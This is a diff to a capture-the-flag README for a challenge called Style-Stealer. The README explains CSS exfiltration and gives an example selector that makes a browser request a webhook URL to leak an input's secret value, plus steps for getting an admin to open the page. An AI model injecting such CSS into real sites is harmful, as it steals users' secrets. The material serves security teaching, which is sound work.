@@ -6,7 +6,7 @@ A CSS Exfiltration Attack occurs when an attacker is able to inject CSS into a w
 
 ### What is a Webhook?
 
-A Webhook is a mechanism that allows data to be sent to a unique URL when certain events occur. One way to explore this is by visiting [webhook.site](webhook.site), a service that provides you with your own unique URL. This URL is private to you, and any visits to it are logged to it. You can also send information along with each visit, such as `webhook/whatever_you_want`.
+A Webhook is a mechanism that allows data to be sent to a unique URL when certain events occur. One way to explore this is by visiting [webhook.site](http://webhook.site), a service that provides you with your own unique URL. This URL is private to you, and any visits to it are logged to it. You can also send information along with each visit, such as `webhook/whatever_you_want`.
 
 ### How to perform a CSS Exfiltration Attack?
 In our challenge `Style-Stealer`, we assume that a secret is stored in an element such as `<input value="secret">`. The idea is to then inject something like `[value="a"] { background: url(webhook/a); }`, which targets an HTML element with a value attribute equal to "a". If such an element exists, the browser will attempt to load a background image from `webhook/a`, effectively making a request to your webhook URL. Although there's no actual image, the request itself logs the data access. Make sure to replace `"webhook"` with your own unique webhook URL.
@@ -38,16 +38,15 @@ The following challenges in increasing difficulty are deployed to [platform.acmc
 ### Solving and Submitting
 
 1. Go to the [style-stealer site](https://style-stealer.acmcyber.com/)
-2. Generate your script.
+2. Generate your script (heh good luck).
 3. Paste your script into the big CSS box.
 4. Put your desired level into the small Level (1-6, 100)
-5. Submit
-6. Test
+5. Submit and Test (ask us if you have questions)
     - On the blank page, click "View style".
     - See if the letter(s) that are displayed match the letter(s) logged on your webhook.
-7. Copy the URL and DM r2uwu2 on Discord.
-8. Once he opens your page, you should get a visit to your webhook with the letter(s) logged there.
-9. If the letters match, he will give you the flag. 
+6. Copy the URL and DM it to `r2uwu2` on Discord.
+7. Once he opens your page, you should get a visit to your webhook with the letter(s) logged there.
+8. If the letters match, he will give you the flag :D. If they don't ...
 
 ## Resources
 
